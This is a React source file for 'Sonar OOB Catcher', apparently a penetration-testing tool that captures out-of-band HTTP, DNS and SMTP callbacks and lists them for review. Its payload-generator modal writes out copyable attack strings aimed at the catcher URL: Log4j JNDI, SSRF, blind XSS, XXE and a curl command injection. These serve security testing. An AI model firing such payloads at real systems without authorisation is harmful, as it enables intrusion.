import { useState, useEffect, useRef } from 'react';
import { Activity, Copy, CheckCircle2, Server, Globe, Zap, Mail, ChevronRight, Hash, Eye, Trash2, Volume2, VolumeX } from 'lucide-react';
import '../styles/SonarCatcher.css';

export default function SonarCatcher() {
  const [running, setRunning] = useState(false);
  const [loading, setLoading] = useState(false);
  const [url, setUrl] = useState('');
  const [interactions, setInteractions] = useState([]);
  const [activeInteraction, setActiveInteraction] = useState(null);
  const [copiedUrl, setCopiedUrl] = useState(false);
  const [copiedRaw, setCopiedRaw] = useState(false);
  const [error, setError] = useState(null);
  const [detailTab, setDetailTab] = useState('request');
  const [mainTab, setMainTab] = useState('pings');
  const [searchTerm, setSearchTerm] = useState('');
  const [protocolFilter, setProtocolFilter] = useState('ALL');
  const [showExploitModal, setShowExploitModal] = useState(false);
  const [alertConfig, setAlertConfig] = useState(null); // { message, onConfirm }
  const [audioEnabled, setAudioEnabled] = useState(true);
  
  // Audio object for sonar ping
  const audioRef = useRef(new Audio('/sonar_ping.wav'));
  const audioEnabledRef = useRef(audioEnabled);
  
  useEffect(() => { audioEnabledRef.current = audioEnabled; }, [audioEnabled]);

  // Use refs to keep event handlers updated without re-rendering listeners
  const interactionsRef = useRef(interactions);
  useEffect(() => { interactionsRef.current = interactions; }, [interactions]);

  useEffect(() => {
    let removeListener = null;
    
    const initStatus = async () => {
      try {
        if (window.electronAPI && window.electronAPI.sonarStatus) {
          const status = await window.electronAPI.sonarStatus();
          if (status.running) {
            setRunning(true);
            setUrl(status.url);
          }
        }
      } catch (e) {
        console.error(e);
      }
    };
    initStatus();

    if (window.electronAPI && window.electronAPI.onSonarInteraction) {
      removeListener = window.electronAPI.onSonarInteraction((data) => {
        // Add to top of list
        const newInt = { ...data, id: Date.now() + Math.random() };
        setInteractions([newInt, ...interactionsRef.current]);
        
        // Play sonar ping sound
        if (audioEnabledRef.current) {
          try {
            audioRef.current.currentTime = 0;
            audioRef.current.play();
          } catch (e) {
            console.error('Audio play failed:', e);
          }
        }
      });
    }
    return () => {
      if (removeListener) removeListener();
    };
  }, []);

  const startSonar = async () => {
    if (running) return;
    setLoading(true);
    setError(null);
    try {
      const res = await window.electronAPI.sonarStart();
      if (res.success) {
        setUrl(res.url);
        setRunning(true);
        setInteractions([]);
        setActiveInteraction(null);
      } else {
        setError(res.error || 'Failed to start Sonar Engine.');
      }
    } catch (err) {
      setError(err.message);
    }
    setLoading(false);
  };

  const stopSonar = async () => {
    if (!running) return;
    try {
      await window.electronAPI.sonarStop();
      setRunning(false);
    } catch (e) {
      console.error(e);
    }
  };

  const copyUrl = () => {
    if (!url) return;
    navigator.clipboard.writeText(url);
    setCopiedUrl(true);
    setTimeout(() => setCopiedUrl(false), 2000);
  };

  const copyPayloadTemplate = (template) => {
    const payload = template.replace('{{URL}}', url);
    navigator.clipboard.writeText(payload);
  };

  const getProtocolIcon = (proto) => {
    const p = (proto || '').toLowerCase();
    if (p.includes('http')) return <Globe size={14} color="#38BDF8" />;
    if (p.includes('dns')) return <Server size={14} color="#A78BFA" />;
    if (p.includes('smtp')) return <Mail size={14} color="#F472B6" />;
    return <Zap size={14} color="#FBBF24" />;
  };

  const copyRawRequest = () => {
    if (activeInteraction) {
      const data = detailTab === 'request' ? activeInteraction.raw_request : activeInteraction.raw_response;
      if (data) {
        navigator.clipboard.writeText(data);
        setCopiedRaw(true);
        setTimeout(() => setCopiedRaw(false), 2000);
      }
    }
  };

  const handleDeleteAll = () => {
    setAlertConfig({
      title: 'Clear All Pings',
      message: 'Are you sure you want to delete all captured interactions? This cannot be undone.',
      onConfirm: () => {
        setInteractions([]);
        setActiveInteraction(null);
        setMainTab('pings');
        setAlertConfig(null);
      }
    });
  };

  const handleDeleteSingle = (id, e) => {
    e.stopPropagation();
    setAlertConfig({
      title: 'Delete Ping',
      message: 'Delete this specific interaction?',
      onConfirm: () => {
        setInteractions(prev => prev.filter(int => int.id !== id));
        if (activeInteraction?.id === id) {
          setActiveInteraction(null);
          setMainTab('pings');
        }
        setAlertConfig(null);
      }
    });
  };

  const handleExport = (format) => {
    if (!activeInteraction) return;
    
    let content = '';
    const filename = `sonar_${activeInteraction.protocol}_${Date.now()}`;
    
    if (format === 'json') {
      content = JSON.stringify(activeInteraction, null, 2);
    } else if (format === 'md') {
      content = `# Sonar OOB Interaction\n\n`;
      content += `**Protocol:** ${activeInteraction.protocol.toUpperCase()}\n`;
      content += `**Remote IP:** ${activeInteraction.remote_address}\n`;
      content += `**Timestamp:** ${new Date(activeInteraction.timestamp).toLocaleString()}\n\n`;
      if (activeInteraction.query_type) content += `**Query Type:** ${activeInteraction.query_type}\n\n`;
      content += `## Raw Request\n\`\`\`http\n${activeInteraction.raw_request || 'None'}\n\`\`\`\n\n`;
      if (activeInteraction.raw_response) {
        content += `## Raw Response\n\`\`\`http\n${activeInteraction.raw_response}\n\`\`\`\n`;
      }
    }

    const blob = new Blob([content], { type: 'text/plain' });
    const dl = document.createElement('a');
    dl.href = URL.createObjectURL(blob);
    dl.download = `${filename}.${format}`;
    dl.click();
  };

  const filteredInteractions = interactions.filter(int => {
    if (protocolFilter !== 'ALL' && int.protocol.toLowerCase() !== protocolFilter.toLowerCase()) return false;
    if (searchTerm) {
      const term = searchTerm.toLowerCase();
      const ipMatch = int.remote_address.toLowerCase().includes(term);
      const reqMatch = (int.raw_request || '').toLowerCase().includes(term);
      const typeMatch = (int.query_type || '').toLowerCase().includes(term);
      if (!ipMatch && !reqMatch && !typeMatch) return false;
    }
    return true;
  });

  return (
    <div className="sonar-root">
      <div className="sonar-header">
        <div className="sonar-title-area">
          <div className="sonar-icon-wrap">
            <Activity className={running ? 'sonar-pulse-icon active' : 'sonar-pulse-icon'} size={24} color="#A78BFA" />
          </div>
          <div>
            <h1>Sonar <span>OOB Catcher</span></h1>
          </div>
        </div>
        
        <div className="sonar-main-tabs">
          <button 
            className={`sonar-main-tab ${mainTab === 'pings' ? 'active' : ''}`}
            onClick={() => setMainTab('pings')}
          >
            <Activity size={14} /> Captured Pings {interactions.length > 0 && `(${interactions.length})`}
          </button>
          <button 
            className={`sonar-main-tab ${mainTab === 'details' ? 'active' : ''}`}
            onClick={() => setMainTab('details')}
            disabled={!activeInteraction}
          >
            <Eye size={14} /> Interaction Details
          </button>
        </div>

        <div className="sonar-controls" style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <button 
            className="sonar-icon-btn" 
            onClick={() => setAudioEnabled(!audioEnabled)}
            title={audioEnabled ? 'Mute Alerts' : 'Unmute Alerts'}
            style={{ padding: '8px', background: 'rgba(255,255,255,0.05)', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.1)' }}
          >
            {audioEnabled ? <Volume2 size={16} /> : <VolumeX size={16} color="#f87171" />}
          </button>
          
          {running ? (
            <button className="sonar-btn stop" onClick={stopSonar}>Stop Sonar Engine</button>
          ) : (
            <button className="sonar-btn start" onClick={startSonar} disabled={loading}>
              {loading ? 'Booting Engine...' : 'Start Sonar Engine'}
            </button>
          )}
        </div>
      </div>

      {error && (
        <div className="sonar-error-banner">
          <span>{error}</span>
          <button onClick={() => setError(null)}>Dismiss</button>
        </div>
      )}

      <div className="sonar-layout">
        {mainTab === 'pings' ? (
        <div className="sonar-stream-panel" style={{ width: '100%', minWidth: '100%', borderRight: 'none' }}>
          <div className="sonar-payload-card">
            <div className="sonar-payload-label">Your Unique Payload URL</div>
            <div style={{ display: 'flex', gap: '12px' }}>
              <div className="sonar-payload-box" onClick={copyUrl} style={{ flex: 1, cursor: 'pointer', position: 'relative', display: 'flex', alignItems: 'center' }}>
                <span className={url ? 'active' : 'inactive'} style={{ paddingRight: '110px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                  {url || 'Waiting for engine to start...'}
                </span>
                <button 
                  onClick={(e) => { e.stopPropagation(); copyUrl(); }}
                  style={{
                    position: 'absolute',
                    right: '12px',
                    background: copiedUrl ? 'rgba(16, 185, 129, 0.2)' : 'rgba(167, 139, 250, 0.2)',
                    border: copiedUrl ? '1px solid #10B981' : '1px solid #a78bfa',
                    color: copiedUrl ? '#10B981' : '#c4b5fd',
                    padding: '6px 12px',
                    borderRadius: '6px',
                    fontSize: '12px',
                    fontWeight: 'bold',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '6px',
                    cursor: 'pointer'
                  }}
                >
                  {copiedUrl ? <CheckCircle2 size={14} /> : <Copy size={14} />}
                  {copiedUrl ? 'Copied' : 'Copy URL'}
                </button>
              </div>
              <button 
                className="sonar-exploit-btn"
                disabled={!url}
                onClick={() => setShowExploitModal(true)}
              >
                <Zap size={14} /> Generator
              </button>
            </div>
          </div>

          <div className="sonar-list-header">
            <h3>Captured Interactions</h3>
            <div className="sonar-list-actions">
              <span className="sonar-badge">{filteredInteractions.length} Pings</span>
              <button className="sonar-icon-btn danger" onClick={handleDeleteAll} title="Clear All Pings"><Trash2 size={14}/></button>
            </div>
          </div>
          
          <div className="sonar-filters">
            <input 
              type="text" 
              placeholder="Search IP, type, or payload..." 
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="sonar-search-input"
            />
            <select 
              value={protocolFilter} 
              onChange={(e) => setProtocolFilter(e.target.value)}
              className="sonar-protocol-select"
            >
              <option value="ALL">All Protocols</option>
              <option value="HTTP">HTTP</option>
              <option value="DNS">DNS</option>
              <option value="SMTP">SMTP</option>
            </select>
          </div>

          <div className="sonar-list-container">
            {filteredInteractions.length === 0 ? (
              <div className="sonar-empty-state">
                <Activity size={48} />
                <div className="empty-title">{running ? (interactions.length === 0 ? 'Listening for pings...' : 'No pings match filter') : 'Engine offline'}</div>
                <div className="empty-sub">
                  {running ? 'Fire your payload at a target to see interactions appear here instantly.' : 'Click "Start Sonar Engine" to generate a payload.'}
                </div>
              </div>
            ) : (
              filteredInteractions.map((int, i) => (
                <div 
                  key={int.id} 
                  className={`sonar-list-item ${activeInteraction?.id === int.id ? 'active' : ''}`}
                  onClick={() => {
                    setActiveInteraction(int);
                    setDetailTab('request');
                    setMainTab('details');
                  }}
                >
                  <div className="sonar-item-proto">{getProtocolIcon(int.protocol)} {int.protocol.toUpperCase()}</div>
                  <div className="sonar-item-meta">
                    <span className="sonar-item-ip">{int.remote_address}</span>
                    <span className="sonar-item-time">{new Date(int.timestamp).toLocaleTimeString()}</span>
                  </div>
                  <button className="sonar-delete-btn" onClick={(e) => handleDeleteSingle(int.id, e)}><Trash2 size={12} /></button>
                </div>
              ))
            )}
          </div>
        </div>
        ) : (
        <div className="sonar-detail-panel">
          {activeInteraction ? (
            <div className="sonar-detail-content">
              <div className="sonar-detail-header">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
                  <h2 style={{ margin: 0 }}>Interaction Details</h2>
                  <div style={{ display: 'flex', gap: '8px' }}>
                    <button className="sonar-export-btn" onClick={() => handleExport('json')}>JSON</button>
                    <button className="sonar-export-btn" onClick={() => handleExport('md')}>Markdown</button>
                  </div>
                </div>
                <div className="sonar-detail-badges">
                  <span className="sonar-badge proto">{activeInteraction.protocol.toUpperCase()}</span>
                  {activeInteraction.query_type && <span className="sonar-badge qtype">Type: {activeInteraction.query_type}</span>}
                </div>
              </div>

              <div className="sonar-detail-grid">
                <div className="sonar-meta-box">
                  <span className="meta-label"><Globe size={12}/> Remote IP</span>
                  <span className="meta-value">{activeInteraction.remote_address}</span>
                </div>
                <div className="sonar-meta-box">
                  <span className="meta-label"><Activity size={12}/> Protocol</span>
                  <span className="meta-value">{activeInteraction.protocol.toUpperCase()}</span>
                </div>
                <div className="sonar-meta-box">
                  <span className="meta-label"><Hash size={12}/> Timestamp</span>
                  <span className="meta-value">{new Date(activeInteraction.timestamp).toLocaleString()}</span>
                </div>
              </div>

              <div className="sonar-raw-section">
                <div className="sonar-raw-header" style={{ borderBottom: '1px solid rgba(255,255,255,0.05)', paddingBottom: '0', display: 'flex', justifyContent: 'space-between' }}>
                  <div className="sonar-tabs" style={{ display: 'flex', gap: '20px' }}>
                    <div 
                      className={`sonar-tab ${detailTab === 'request' ? 'active' : ''}`}
                      onClick={() => setDetailTab('request')}
                    >
                      <Eye size={14} /> Request
                    </div>
                    {activeInteraction.raw_response && (
                      <div 
                        className={`sonar-tab ${detailTab === 'response' ? 'active' : ''}`}
                        onClick={() => setDetailTab('response')}
                      >
                        <Server size={14} /> Response
                      </div>
                    )}
                  </div>
                  <button className="sonar-copy-btn" onClick={copyRawRequest} title="Copy Raw Data" style={{ marginBottom: '8px' }}>
                    {copiedRaw ? <CheckCircle2 size={14} color="#10B981" /> : <Copy size={14} />} 
                    {copiedRaw ? 'Copied!' : 'Copy'}
                  </button>
                </div>
                <pre className="sonar-raw-code">
                  <code>{detailTab === 'request' ? (activeInteraction.raw_request || 'No raw request data available.') : (activeInteraction.raw_response || 'No raw response data available.')}</code>
                </pre>
              </div>
            </div>
          ) : (
            <div className="sonar-detail-empty">
              <Zap size={64} />
              <h3>No Interaction Selected</h3>
              <p>Select a ping from the left panel to view full HTTP headers, DNS query details, and raw payloads.</p>
            </div>
          )}
        </div>
        )}
      </div>

      {/* Exploit Generator Modal */}
      {showExploitModal && (
        <div className="sonar-modal-overlay" onClick={() => setShowExploitModal(false)}>
          <div className="sonar-modal" onClick={e => e.stopPropagation()}>
            <div className="sonar-modal-header">
              <h3>Payload Generator</h3>
              <button className="sonar-modal-close" onClick={() => setShowExploitModal(false)}>×</button>
            </div>
            <div className="sonar-modal-body">
              <div className="sonar-payload-row">
                <span className="sonar-payload-name">Log4j</span>
                <div className="sonar-payload-code">{"${jndi:ldap://" + url + "/a}"}</div>
                <button onClick={() => copyPayloadTemplate("${jndi:ldap://{{URL}}/a}")}><Copy size={14}/></button>
              </div>
              <div className="sonar-payload-row">
                <span className="sonar-payload-name">SSRF</span>
                <div className="sonar-payload-code">http://{url}</div>
                <button onClick={() => copyPayloadTemplate("http://{{URL}}")}><Copy size={14}/></button>
              </div>
              <div className="sonar-payload-row">
                <span className="sonar-payload-name">Blind XSS</span>
                <div className="sonar-payload-code">{`"><script src="http://${url}"></script>`}</div>
                <button onClick={() => copyPayloadTemplate(`"><script src="http://{{URL}}"></script>`)}><Copy size={14}/></button>
              </div>
              <div className="sonar-payload-row">
                <span className="sonar-payload-name">XXE</span>
                <div className="sonar-payload-code">{`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${url}"> ]>`}</div>
                <button onClick={() => copyPayloadTemplate(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{URL}}"> ]>`)}><Copy size={14}/></button>
              </div>
              <div className="sonar-payload-row">
                <span className="sonar-payload-name">Cmd Injection</span>
                <div className="sonar-payload-code">{`; curl http://${url} ;`}</div>
                <button onClick={() => copyPayloadTemplate(`; curl http://{{URL}} ;`)}><Copy size={14}/></button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Custom Alert Modal */}
      {alertConfig && (
        <div className="sonar-alert-overlay">
          <div className="sonar-alert-box">
            <Trash2 size={32} color="#f87171" style={{ marginBottom: '16px' }} />
            <h3>{alertConfig.title}</h3>
            <p>{alertConfig.message}</p>
            <div className="sonar-alert-actions">
              <button className="sonar-alert-btn cancel" onClick={() => setAlertConfig(null)}>Cancel</button>
              <button className="sonar-alert-btn confirm" onClick={alertConfig.onConfirm}>Delete</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
